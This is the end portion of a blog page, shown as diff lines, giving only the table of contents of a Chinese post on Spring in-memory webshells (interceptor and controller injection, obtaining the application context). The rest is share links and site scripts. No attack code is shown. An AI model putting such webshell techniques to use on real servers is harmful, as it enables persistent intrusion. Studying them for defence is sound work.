+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#spring%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">spring内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bean"><span class="toc-number">1.1.1.</span> <span class="toc-text">Bean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ApplicationContext"><span class="toc-number">1.1.2.</span> <span class="toc-text">ApplicationContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContextLoaderListener-%E4%B8%8E-DispatcherServlet"><span class="toc-number">1.1.3.</span> <span class="toc-text">ContextLoaderListener 与 DispatcherServlet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ContextLoaderListener"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">ContextLoaderListener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DispatcherServlet"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">DispatcherServlet</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">1.1.4.</span> <span class="toc-text">获取上下文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9AgetCurrentWebApplicationContext"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">方法一：getCurrentWebApplicationContext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AWebApplicationContextUtils"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">方法二：WebApplicationContextUtils</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9ARequestContextUtils"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">方法三：RequestContextUtils</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B-getAttribute"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">方法四: getAttribute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94-LiveBeansView"><span class="toc-number">1.1.4.5.</span> <span class="toc-text">方法五:LiveBeansView</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96HandlerMapping"><span class="toc-number">1.1.5.</span> <span class="toc-text">获取HandlerMapping</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intercetor%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">intercetor内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intercetor-demo"><span class="toc-number">1.2.2.</span> <span class="toc-text">intercetor demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Controller-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Controller 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#controller%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">controller创建过程</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&text=spring内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=spring内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=spring内存马&body=Check out this article: http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&name=spring内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&t=spring内存马"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
